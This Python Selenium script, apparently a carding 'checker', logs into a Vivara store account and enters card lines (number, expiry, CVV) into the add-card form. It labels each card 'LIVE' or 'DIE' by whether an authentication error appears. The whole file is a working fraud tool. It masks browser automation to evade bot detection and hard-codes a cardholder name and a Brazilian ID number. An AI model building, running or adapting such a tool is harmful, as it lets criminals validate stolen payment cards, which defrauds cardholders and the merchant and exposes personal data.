import os
import time
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.chrome.service import Service

class VivaraChecker:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.screenshot_dir = "screenshots_vivara"
        os.makedirs(self.screenshot_dir, exist_ok=True)

    def _save_screenshot(self, driver, step: str):
        """Salva screenshot com timestamp e passo onde ocorreu o erro."""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{self.screenshot_dir}/vivara_error_{step}_{timestamp}.png"
            driver.save_screenshot(filename)
            print(f"[DEBUG] Screenshot salvo: {filename}")
            return filename
        except Exception as e:
            print(f"[DEBUG] Falha ao salvar screenshot: {e}")
            return None

    def _get_driver(self):
        """Cria e retorna uma instância do Chrome otimizada."""
        options = webdriver.ChromeOptions()
        options.add_argument('--headless=new')  # Descomente para produção
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-extensions')
        options.add_argument('--blink-settings=imagesEnabled=false')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--log-level=3')
        options.add_experimental_option('excludeSwitches', ['enable-automation'])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

        # Caminhos comuns
        chromium_paths = [
            '/usr/bin/google-chrome',
            '/usr/bin/chromium-browser',
            '/usr/bin/chromium'
        ]
        for path in chromium_paths:
            if os.path.exists(path):
                options.binary_location = path
                break

        # ==================== CORREÇÃO DO SERVICE ====================
        driver = None
        chromedriver_paths = [
            '/usr/bin/chromedriver',
            '/usr/local/bin/chromedriver',
            '/usr/local/share/chromedriver',
            'chromedriver.exe'
        ]

        for path in chromedriver_paths:
            try:
                if os.path.exists(path):
                    service = Service(executable_path=path)
                    driver = webdriver.Chrome(service=service, options=options)
                    print(f"[Vivara] ChromeDriver iniciado com: {path}")
                    break
                elif path == 'chromedriver.exe':  # Tentativa local no Windows
                    service = Service()
                    driver = webdriver.Chrome(service=service, options=options)
                    print("[Vivara] ChromeDriver iniciado (modo automático)")
                    break
            except Exception as e:
                print(f"[Vivara] Falha ao usar chromedriver {path}: {e}")
                continue

        # Última tentativa (Selenium Manager - automático)
        if not driver:
            try:
                print("[Vivara] Tentando iniciar ChromeDriver automaticamente...")
                driver = webdriver.Chrome(options=options)
                print("[Vivara] ChromeDriver iniciado via Selenium Manager")
            except Exception as e:
                print(f"[Checker] Erro fatal ao iniciar Chrome: {e}")
                return None

        if driver:
            driver.set_page_load_timeout(30)
            driver.maximize_window()

        return driver

    def test_card(self, linha):
        driver = self._get_driver()
        if not driver:
            return "ERROR: Falha ao iniciar navegador"
            
        try:
            wait = WebDriverWait(driver, 15)
            
            # === 1~4. Login + Preenchimento (simplificado) ===
            linha = linha.strip()
            partes = linha.split("|")
            if len(partes) != 4:
                return "DIE"
            
            numero, mes, ano, cvv = partes
            validade = f"{mes}/{ano[-2:]}" if len(ano) == 4 else f"{mes}/{ano}"

            driver.get("https://www.vivara.com.br/api/io/login?returnUrl=https://www.vivara.com.br/")

            # Cookies
            try:
                btn_cookies = WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.XPATH, "//button[contains(text(), 'Aceitar') or contains(text(), 'Concordar')]"))
                )
                driver.execute_script("arguments[0].click();", btn_cookies)
            except: pass

            # Login
            wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Ex.: exemplo@mail.com']"))).send_keys(self.email)
            wait.until(EC.element_to_be_clickable((By.XPATH, "//input[@placeholder='Adicione sua senha']"))).send_keys(self.password)

            btn_entrar = wait.until(EC.element_to_be_clickable((By.XPATH, "//div[contains(@class, 'vtex-login-2-x-sendButton')]//button")))
            driver.execute_script("arguments[0].click();", btn_entrar)

            wait.until(EC.url_contains("vivara.com.br"))
            time.sleep(5)
            driver.get("https://www.vivara.com.br/api/io/account#/cards/new")

            # Preenchimento
            def fill_field(name, value):
                try:
                    el = wait.until(EC.presence_of_element_located((By.NAME, name)))
                    el.clear()
                    el.send_keys(value)
                    return True
                except:
                    driver.switch_to.default_content()
                    for iframe in driver.find_elements(By.TAG_NAME, "iframe"):
                        try:
                            driver.switch_to.frame(iframe)
                            els = driver.find_elements(By.NAME, name)
                            if els:
                                els[0].clear()
                                els[0].send_keys(value)
                                return True
                        except: pass
                        driver.switch_to.default_content()
                return False

            fill_field("cc-number", numero)
            fill_field("cardHolder", "Cleomar B Silva")
            fill_field("cc-exp", validade)
            fill_field("cc-csc", cvv)
            fill_field("documentType", "")
            fill_field("document", "84830336072")

            # ====================== SALVAR ======================
            xpath_save = "//button[@type='submit'] | //button[contains(translate(text(), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'salvar novo cartão')]"

            print("[Vivara] Tentando clicar em Salvar...")
            btn_salvar = WebDriverWait(driver, 20).until(
                EC.element_to_be_clickable((By.XPATH, xpath_save))
            )
            driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", btn_salvar)
            time.sleep(2)
            driver.execute_script("arguments[0].click();", btn_salvar)
            print("[Vivara] ✅ Botão Salvar clicado - Aguardando resposta...")

            # ====================== AGUARDA RESPOSTA ======================
            error_msg = "Falha ao autenticar o cartão. Verifique os dados do cartão e tente novamente."
            start_time = time.time()
            max_wait = 45

            time.sleep(6)  # Tempo mínimo obrigatório

            while time.time() - start_time < max_wait:
                try:
                    page_source = driver.page_source

                    if error_msg in page_source:
                        self._save_screenshot(driver, "ERROR_MESSAGE")
                        print("[Vivara] ❌ Mensagem de erro detectada → DIE")
                        return "DIE"

                    # Verifica iframes
                    driver.switch_to.default_content()
                    for iframe in driver.find_elements(By.TAG_NAME, "iframe"):
                        try:
                            driver.switch_to.frame(iframe)
                            if error_msg in driver.page_source:
                                self._save_screenshot(driver, "ERROR_IFRAME")
                                print("[Vivara] ❌ Erro em iframe → DIE")
                                return "DIE"
                        except:
                            pass
                        finally:
                            driver.switch_to.default_content()

                    if (time.time() - start_time) >= 8:
                        print(f"[Vivara] ✅ Nenhum erro após {int(time.time()-start_time)}s → LIVE")
                        return "LIVE"

                except WebDriverException:
                    print("[Vivara] Página recarregou ou mudou → Considerando LIVE")
                    return "LIVE"
                except Exception as inner_e:
                    print(f"[Vivara] Erro durante espera: {type(inner_e).__name__}")
                    self._save_screenshot(driver, "EXCEPTION_WAIT")

                time.sleep(1.5)

            print("[Vivara] Timeout sem erro → LIVE")
            return "LIVE"

        except Exception as e:
            print(f"[Vivara] Erro geral no test_card: {type(e).__name__} | {str(e)[:200]}")
            if 'driver' in locals() and driver:
                self._save_screenshot(driver, "CRITICAL_ERROR")
            return "DIE"
        finally:
            try:
                driver.quit()
            except:
                pass
